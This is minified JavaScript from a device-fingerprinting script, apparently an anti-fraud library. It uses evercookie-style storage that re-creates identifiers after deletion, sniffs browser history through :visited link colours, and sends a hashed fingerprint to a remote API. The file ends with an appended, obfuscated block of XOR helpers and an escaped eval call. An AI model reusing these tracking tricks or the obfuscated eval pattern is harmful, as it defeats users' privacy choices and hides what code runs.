                    }
                } catch (A) {
                }
            };
            this.evercookie_session_storage = function (a, b) {
                try {
                    if (Oa) if (void 0 !==
                        b) Oa.setItem(a, b); else return Oa.getItem(a)
                } catch (z) {
                }
            };
            this.evercookie_global_storage = function (a, b) {
                if (Ma) {
                    var c = this.getHost();
                    try {
                        if (void 0 !== b) Ma[c][a] = b; else return Ma[c][a]
                    } catch (A) {
                    }
                }
            };
            this.encode = function (a) {
                var b = "", c, d, e, f, g, h, k = 0;
                for (a = this._utf8_encode(a); k < a.length;) c = a.charCodeAt(k++), d = a.charCodeAt(k++), e = a.charCodeAt(k++), f = c >> 2, c = (c & 3) << 4 | d >> 4, g = (d & 15) << 2 | e >> 6, h = e & 63, isNaN(d) ? g = h = 64 : isNaN(e) && (h = 64), b = b + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x3d".charAt(f) +
                    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x3d".charAt(c) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x3d".charAt(g) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x3d".charAt(h);
                return b
            };
            this.decode = function (a) {
                var b = "", c, d, e, f, g, h = 0;
                for (a = a.replace(/[^A-Za-z0-9\+\/\=]/g, ""); h < a.length;) c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x3d".indexOf(a.charAt(h++)), d = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x3d".indexOf(a.charAt(h++)),
                    f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x3d".indexOf(a.charAt(h++)), g = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x3d".indexOf(a.charAt(h++)), c = c << 2 | d >> 4, d = (d & 15) << 4 | f >> 2, e = (f & 3) << 6 | g, b += String.fromCharCode(c), 64 !== f && (b += String.fromCharCode(d)), 64 !== g && (b += String.fromCharCode(e));
                return b = this._utf8_decode(b)
            };
            this._utf8_encode = function (a) {
                a = a.replace(/\r\n/g, "\n");
                for (var b = "", c = 0, d = a.length, e; c < d; c++) e = a.charCodeAt(c), 128 > e ? b += String.fromCharCode(e) :
                    (127 < e && 2048 > e ? b += String.fromCharCode(e >> 6 | 192) : (b += String.fromCharCode(e >> 12 | 224), b += String.fromCharCode(e >> 6 & 63 | 128)), b += String.fromCharCode(e & 63 | 128));
                return b
            };
            this._utf8_decode = function (a) {
                for (var b = "", c = 0, d = a.length, e, f, g; c < d;) e = a.charCodeAt(c), 128 > e ? (b += String.fromCharCode(e), c += 1) : 191 < e && 224 > e ? (f = a.charCodeAt(c + 1), b += String.fromCharCode((e & 31) << 6 | f & 63), c += 2) : (f = a.charCodeAt(c + 1), g = a.charCodeAt(c + 2), b += String.fromCharCode((e & 15) << 12 | (f & 63) << 6 | g & 63), c += 3);
                return b
            };
            this.evercookie_history = function (a,
                                                b) {
                var c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\x3d-".split(""),
                    d = "" + this.getHost() + "/" + a, e, f = "", g = "", h = 1;
                if (void 0 !== b) {
                    if (!this.hasVisited(d)) {
                        this.createIframe(d, "if");
                        d += "/";
                        c = this.encode(b).split("");
                        for (e = 0; e < c.length; e++) d += c[e], this.createIframe(d, "if" + e);
                        this.createIframe(d + "-", "if_")
                    }
                } else if (this.hasVisited(d)) {
                    for (d += "/"; "-" !== f && 1 === h;) for (e = h = 0; e < c.length; e++) if (this.hasVisited(d + c[e])) {
                        f = c[e];
                        "-" !== f && (g += f);
                        d += f;
                        h = 1;
                        break
                    }
                    return this.decode(g)
                }
            };
            this.createElem =
                function (a, b, c) {
                    a = void 0 !== b && t.getElementById(b) ? t.getElementById(b) : t.createElement(a);
                    a.style.visibility = "hidden";
                    a.style.position = "absolute";
                    b && a.setAttribute("id", b);
                    c && t.body.appendChild(a);
                    return a
                };
            this.createIframe = function (a, b) {
                this.createElem("iframe", b, 1).setAttribute("src", a)
            };
            var p = this.waitForSwf = function (a) {
                void 0 === a ? a = 0 : a++;
                a < g && "undefined" === typeof ib && setTimeout(function () {
                    p(a)
                }, 300)
            };
            this.evercookie_cookie = function (a, b) {
                if (void 0 !== b) t.cookie = a + "\x3d" + b + "; expires\x3dTue, 31 Dec 2030 00:00:00 UTC; path\x3d/; domain\x3d" +
                    k; else return this.getFromStr(a, t.cookie)
            };
            this.getFromStr = function (a, b) {
                if ("string" === typeof b) {
                    var c = a + "\x3d", d = b.split(/[;&]/), e, f;
                    for (e = 0; e < d.length; e++) {
                        for (f = d[e]; " " === f.charAt(0);) f = f.substring(1, f.length);
                        if (0 === f.indexOf(c)) return f.substring(c.length, f.length)
                    }
                }
            };
            this.getHost = function () {
                return Ga(r.location.host.split(":")[0])
            };
            this.toHex = function (a) {
                for (var b = "", c = a.length, d = 0, e; d < c;) {
                    for (e = a.charCodeAt(d++).toString(16); 2 > e.length;) e = "0" + e;
                    b += e
                }
                return b
            };
            this.fromHex = function (a) {
                for (var b =
                    "", c = a.length, d; 0 <= c;) d = c - 2, b = String.fromCharCode("0x" + a.substring(d, c)) + b, c = d;
                return b
            };
            this.hasVisited = function (a) {
                -1 === this.no_color && -1 === this._getRGB("", -1) && (this.no_color = this._getRGB("" + Math.floor(9999999 * Math.random()) + "rand.com"));
                return 0 === a.indexOf("https:") || 0 === a.indexOf("http:") ? this._testURL(a, this.no_color) : this._testURL("http://" + a, this.no_color) || this._testURL("https://" + a, this.no_color) || this._testURL("http://www." + a, this.no_color) || this._testURL("https://www." + a, this.no_color)
            };
            var u = this.createElem("a", "_ec_rgb_link"), y, x;
            try {
                y = 1, x = t.createElement("style"), x.styleSheet ? x.styleSheet.innerHTML = "#_ec_rgb_link:visited{display:none;color:#FF0000}" : x.innerHTML ? x.innerHTML = "#_ec_rgb_link:visited{display:none;color:#FF0000}" : x.appendChild(t.createTextNode("#_ec_rgb_link:visited{display:none;color:#FF0000}"))
            } catch (q) {
                y = 0
            }
            this._getRGB = function (a, b) {
                if (b && 0 === y) return -1;
                u.href = a;
                u.innerHTML = a;
                t.body.appendChild(x);
                t.body.appendChild(u);
                var c;
                if (t.defaultView) {
                    if (null == t.defaultView.getComputedStyle(u,
                        null)) return -1;
                    c = t.defaultView.getComputedStyle(u, null).getPropertyValue("color")
                } else c = u.currentStyle.color;
                return c
            };
            this._testURL = function (a, b) {
                var c = this._getRGB(a);
                return "rgb(255, 0, 0)" === c || "#ff0000" === c || b && c !== b ? 1 : 0
            }
        }
    } catch (a) {
    }
    var kb = {
        postMessage: function (a, b) {
            b = b || parent;
            if (b.postMessage) b.postMessage(a, "*"); else if (a && "function" == typeof navigator.onData) navigator.onData(a)
        }
    };
    ga.prototype = {
        checkBroswer: function () {
            navigator.userAgent.toString().indexOf("MSIE")
        }, checkOperaBroswer: function () {
            return window.opera
        },
        getCanvansCode: function (a) {
            var b;
            b = this.checkWapOrWeb() ? "wapSmartID" : "webSmartID";
            return new n(b, a)
        }, getCookieCode: function () {
            return "" == F("BSFIT_OkLJUJ") || null == F("BSFIT_OkLJUJ") || void 0 == F("BSFIT_OkLJUJ") || 32 != F("BSFIT_OkLJUJ").length ? new n("cookieCode", "new") : new n("cookieCode", F("BSFIT_OkLJUJ"))
        }, getUserAgent: function () {
            var a = navigator.userAgent, a = a.replace(/\&|\+/g, "");
            return new n("userAgent", a.toString())
        }, getScrHeight: function () {
            return new n("scrHeight", window.screen.height.toString())
        }, getScrWidth: function () {
            return new n("scrWidth",
                window.screen.width.toString())
        }, getScrAvailHeight: function () {
            return new n("scrAvailHeight", window.screen.availHeight.toString())
        }, getScrAvailWidth: function () {
            return new n("scrAvailWidth", window.screen.availWidth.toString())
        }, md5ScrColorDepth: function () {
            return new n("scrColorDepth", window.screen.colorDepth.toString())
        }, getScrDeviceXDPI: function () {
            var a;
            a = "IE" == this.checkBroswer() ? window.screen.deviceXDPI.toString() : "";
            return new n("scrDeviceXDPI", a)
        }, getAppCodeName: function () {
            return new n("appCodeName",
                navigator.appCodeName.toString())
        }, getAppName: function () {
            return new n("appName", navigator.appName.toString())
        }, getJavaEnabled: function () {
            return new n("javaEnabled", navigator.javaEnabled() ? "1" : "0")
        }, getMimeTypes: function () {
            for (var a = navigator.mimeTypes, b = "", c = 0; c < a.length; c++) b += a[c].type + "#";
            return new n("mimeTypes", Z(b.substr(0, b.length - 1)))
        }, getPlatform: function () {
            return new n("os", navigator.platform.toString())
        }, getAppMinorVersion: function () {
            var a;
            a = "IE" == this.checkBroswer() ? navigator.appMinorVersion.toString() :
                "";
            return new n("appMinorVersion", a)
        }, getBrowserLanguage: function () {
            var a;
            a = "IE" == this.checkBroswer() || this.checkOperaBroswer() ? navigator.browserLanguage.toString() : this.getLanguage();
            return new n("browserLanguage", a)
        }, getLanguage: function () {
            return null != navigator.language ? navigator.language.toString() : ""
        }, getCookieEnabled: function () {
            return new n("cookieEnabled", navigator.cookieEnabled ? "1" : "0")
        }, getCpuClass: function () {
            var a;
            a = "IE" == this.checkBroswer() ? navigator.cpuClass.toString() : "";
            return new n("cpuClass",
                a)
        }, getOnLine: function () {
            return new n("onLine", navigator.onLine.toString())
        }, getSystemLanguage: function () {
            var a;
            a = "IE" == this.checkBroswer() || this.checkOperaBroswer() ? navigator.systemLanguage.toString() : "";
            return new n("systemLanguage", a)
        }, getUserLanguage: function () {
            var a;
            a = "IE" == this.checkBroswer() || this.checkOperaBroswer() ? navigator.userLanguage.toString() : "";
            return new n("userLanguage", a)
        }, getTimeZone: function () {
            var a = (new Date).getTimezoneOffset() / 60;
            return new n("timeZone", a)
        }, getPlugins: function (a) {
            if ("IE" ==
                this.checkBroswer()) return new n("plugins", Z(a.replace(RegExp(",", "gm"), "#")));
            a = navigator.plugins;
            var b = "";
            for (i = 0; i < a.length; i++) b += a[i].name.toString() + "#";
            return new n("plugins", Z(b))
        }, getFlashVersion: function () {
            var a = 0;
            if ("IE" == this.checkBroswer()) var b = new ActiveXObject("ShockwaveFlash.ShockwaveFlash"),
                a = Number(b.GetVariable("$version").split(" ")[1].replace(/,/g, ".").replace(/^(d+.d+).*$/, "$1")); else navigator.plugins && 0 < navigator.plugins.length && (b = navigator.plugins["Shockwave Flash"]) && (flashArr =
                b.description.split(" "), a = flashArr[2] + " " + flashArr[3]);
            return new n("flashVersion", a)
        }, getHistoryList: function () {
            return new n("historyList", window.history.length)
        }, getSessionStorage: function (a) {
            return new n("sessionStorage", a)
        }, getLocalStorage: function (a) {
            return new n("localStorage", a)
        }, getIndexedDb: function (a) {
            return new n("indexedDb", a)
        }, getOpenDatabase: function (a) {
            return new n("openDatabase", a)
        }, getDoNotTrack: function (a) {
            return new n("doNotTrack", a)
        }, getAdblock: function (a) {
            return new n("adblock",
                a)
        }, getHasLiedLanguages: function (a) {
            return new n("hasLiedLanguages", a)
        }, getHasLiedResolution: function (a) {
            return new n("hasLiedResolution", a)
        }, getHasLiedOs: function (a) {
            return new n("hasLiedOs", a)
        }, getHasLiedBrowser: function (a) {
            return new n("hasLiedBrowser", a)
        }, getTouchSupport: function (a) {
            return new n("touchSupport", Z(a.replace(RegExp(",", "gm"), "#")))
        }, getJsFonts: function (a) {
            return new n("jsFonts", Z(a.replace(RegExp(",", "gm"), "#")))
        }, getCustId: function () {
            return new n("custID", "130")
        }, getUUID: function () {
            return "" ==
            F("BSFIT_UUID") || null == F("BSFIT_UUID") || void 0 == F("BSFIT_UUID") ? new n("cookieCode", "new") : new n("UUID", F("BSFIT_UUID"))
        }, getSendPlatform: function () {
            var a;
            a = this.checkWapOrWeb() ? Ya[1] : Ya[0];
            return new n("platform", a)
        }, getDfpMoreInfo: function (a) {
            var b = this;
            this.moreInfoArray = [];
            b.cfp.get(function (c, d) {
                b.moreInfoArray.push(b.getCanvansCode(c + ""));
                for (var e in d) {
                    c = d[e].key;
                    var f = d[e].value + "";
                    switch (c) {
                        case "session_storage":
                            b.moreInfoArray.push(b.getSessionStorage(f));
                            break;
                        case "local_storage":
                            b.moreInfoArray.push(b.getLocalStorage(f));
                            break;
                        case "indexed_db":
                            b.moreInfoArray.push(b.getIndexedDb(f));
                            break;
                        case "open_database":
                            b.moreInfoArray.push(b.getOpenDatabase(f));
                            break;
                        case "do_not_track":
                            b.moreInfoArray.push(b.getDoNotTrack(f));
                            break;
                        case "ie_plugins":
                            b.moreInfoArray.push(b.getPlugins(f));
                            break;
                        case "regular_plugins":
                            b.moreInfoArray.push(b.getPlugins());
                            break;
                        case "adblock":
                            b.moreInfoArray.push(b.getAdblock(f));
                            break;
                        case "has_lied_languages":
                            b.moreInfoArray.push(b.getHasLiedLanguages(f));
                            break;
                        case "has_lied_resolution":
                            b.moreInfoArray.push(b.getHasLiedResolution(f));
                            break;
                        case "has_lied_os":
                            b.moreInfoArray.push(b.getHasLiedOs(f));
                            break;
                        case "has_lied_browser":
                            b.moreInfoArray.push(b.getHasLiedBrowser(f));
                            break;
                        case "touch_support":
                            b.moreInfoArray.push(b.getTouchSupport(f));
                            break;
                        case "js_fonts":
                            b.moreInfoArray.push(b.getJsFonts(f))
                    }
                }
                "function" == typeof a && a()
            })
        }, getMachineCode: function () {
            return [this.getUUID(), this.getCookieCode(), this.getUserAgent(), this.getScrHeight(), this.getScrWidth(), this.getScrAvailHeight(), this.getScrAvailWidth(), this.md5ScrColorDepth(),
                this.getScrDeviceXDPI(), this.getAppCodeName(), this.getAppName(), this.getJavaEnabled(), this.getMimeTypes(), this.getPlatform(), this.getAppMinorVersion(), this.getBrowserLanguage(), this.getCookieEnabled(), this.getCpuClass(), this.getOnLine(), this.getSystemLanguage(), this.getUserLanguage(), this.getTimeZone(), this.getFlashVersion(), this.getHistoryList(), this.getCustId(), this.getSendPlatform()]
        }, checkWapOrWeb: function () {
            return "WindowsPhone" == Ha() || "iOS" == Ha() || "Android" == Ha() ? !0 : !1
        }, getpackStr: function (a) {
            var b =
                [], b = this.getMachineCode(), b = b.concat(this.moreInfoArray);
            null != a && void 0 != a && "" != a && 32 == a.length && b.push(new n("cookieCode", a));
            b.sort(function (a, b) {
                var c, d;
                if ("object" === typeof a && "object" === typeof b && a && b) return c = a.key, d = b.key, c === d ? 0 : typeof c === typeof d ? c < d ? -1 : 1 : typeof c < typeof d ? -1 : 1;
                throw"error";
            });
            return b
        }, NeedUpdate: function () {
            var a = F("fp_ver");
            return null == a || "" == a || void 0 == a || "4.5.2" != a ? (na("fp_ver", "4.5.2", 1E3), !0) : !1
        }, initEc: function (a) {
            var b = this, c = void 0 != a && void 0 != a.localAddr ? a.localAddr :
                "";
            b.checkWapOrWeb();
            this.ec.get("BSFIT_OkLJUJ", function () {
                b.getDfpMoreInfo(function () {
                    if (!(9E5 < F("BSFIT_EXPIRATION") - (new Date).getTime() & null != F("BSFIT_DEVICEID") & void 0 != F("BSFIT_DEVICEID") & !b.NeedUpdate())) {
                        for (var a = "", e = "", f = b.getpackStr(""), g = [], h = [], l = [], p = [], k = 0; k < f.length; k++) "new" != f[k].value && -1 == qb.indexOf(f[k].key) && (-1 != rb.indexOf(f[k].key) ? h.push(f[k]) : -1 != sb.indexOf(f[k].key) ? l.push(f[k]) : -1 != tb.indexOf(f[k].key) ? p.push(f[k]) : g.push(f[k]));
                        f = "";
                        for (k = 0; k < h.length; k++) f = f + h[k].key.charAt(0) +
                            h[k].value;
                        h = "";
                        for (k = 0; k < p.length; k++) h = 0 == k ? h + p[k].value : h + "x" + p[k].value;
                        p = "";
                        for (k = 0; k < l.length; k++) p = 0 == k ? p + l[k].value : p + "x" + l[k].value;
                        g.push(new n("storeDb", f));
                        g.push(new n("srcScreenSize", h));
                        g.push(new n("scrAvailSize", p));
                        "" != c && g.push(new n("localCode", pb(c)));
                        g.sort(function (a, b) {
                            var c, d;
                            if ("object" === typeof a && "object" === typeof b && a && b) return c = a.key, d = b.key, c === d ? 0 : typeof c === typeof d ? c < d ? -1 : 1 : typeof c < typeof d ? -1 : 1;
                            throw"error";
                        });
                        for (l = 0; l < g.length; l++) p = g[l].key.replace(RegExp("%",
                            "gm"), ""), h = "", h = "string" == typeof g[l].value ? g[l].value.replace(RegExp("%", "gm"), "") : g[l].value, "" !== h && (e += p + h, h = encodeURIComponent(h), a += "\x26" + (void 0 == $a[p] ? p : $a[p]) + "\x3d" + h);
                        e = xa(e);
                        e = xa(e);
                        g = "";
                        l = e.length;
                        for (p = 0; p < l; p++) h = e.charAt(p).charCodeAt(0), g = 127 === h ? g + String.fromCharCode(0) : g + String.fromCharCode(h + 1);
                        e = Q.SHA256(g).toString(Q.enc.Base64);
                        e = xa(e);
                        e = Q.SHA256(e).toString(Q.enc.Base64);
                        a += "\x26timestamp\x3d" + (new Date).getTime();
                        Za.getJSON("https://frms-new-api.tuniu.cn/public/generate/jsonp" +
                            ("?algID\x3dwxrdRQBLt0\x26hashCode\x3d" + e + a), null, function (a) {
                            var c = JSON.parse(a);
                            void 0 != kb && kb.postMessage(a, window.parent);
                            for (var d in c) "dfp" == d ? F("BSFIT_DEVICEID") != c[d] && (na("BSFIT_DEVICEID", c[d], 1E3), b.deviceEc.set("BSFIT_DEVICEID", c[d])) : "exp" == d ? na("BSFIT_EXPIRATION", c[d], 1E3) : "cookieCode" == d && b.ec.set("BSFIT_OkLJUJ", c[d])
                        })
                    }
                })
            }, 0)
        }, getFingerPrint: function () {
            var a = this;
            window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection ? mb(function (b) {
                a.initEc(b)
            }) : a.initEc()
        }
    };
    var lb = !1;
    document.addEventListener ? document.addEventListener("DOMContentLoaded", function b() {
        document.removeEventListener("DOMContentLoaded", b, !1);
        Pa()
    }, !1) : document.attachEvent && document.attachEvent("onreadystatechange", function c() {
        lb || "interactive" != document.readyState && "complete" != document.readyState || (document.detachEvent("onreadystatechange", c), Pa(), lb = !0)
    })
})();
/*ODVR*/
var /*eeD*/
    __7ePecY5TJ/*MaCW*/ = \u0053\u0074\u0072\u0069\u006e\u0067/*Rf7*/./*wT*/\u0066r\u006fm\u0043ha\u0072C\u006fde/*TvH*/;
var /*IK0*/_x_e5n = [/*1VU*/3095, 1372, 3136, 3449, 2162, /*ZWj*/];
var /*hd*/_$lFz/*ue2*/ = /*Nx3U*/function (/*ORG*/) {/*VJM*/
    return /*6QC*/arguments[/*G0v*/0] ^ /*BY7*//*g8N*/_x_e5n[/*Fvi5*/0];
    /*nKsl*/
}/*GgcX*/;
var /*1G*/_$m4kq/*xOIP*/ = /*fCYB*/function (/*YI*/) {/*Vc*/
    return /*GV5p*/arguments[/*Jw5L*/0] ^ /*97IY*//*YZm*/_x_e5n[/*FPQ*/1];
    /*SG*/
}/*ezy*/;
var /*Q3*/_$dKxD/*vW*/ = /*TI*/function (/*8Eje*/) {/*ohK*/
    return /*4Y0*/arguments[/*A1*/0] ^ /*tA*//*eSK7*/_x_e5n[/*4Q9*/2];
    /*mme*/
}/*Ssin*/;
var /*Zs*/_$5EvD/*Ld*/ = /*cY*/function (/*qZZo*/) {/*eHc*/
    return /*xB8K*/arguments[/*xVA9*/0] ^ /*b5*//*1uvO*/_x_e5n[/*inI*/3];
    /*YqA*/
}/*1eq8*/;
var /*zvO*/_$e7K/*Q1*/ = /*zD*/function (/*Jncw*/) {/*5T*/
    return /*4Fa*/arguments[/*FHw*/0] ^ /*LnCG*//*5eG*/_x_e5n[/*Dw*/4];
    /*ad*/
}/*1E*/;
/*akC*/
\u0065\u0076\u0061\u006c/*zaF*/(__7ePecY5TJ(32/*LwgL80*/));
/*rN2*/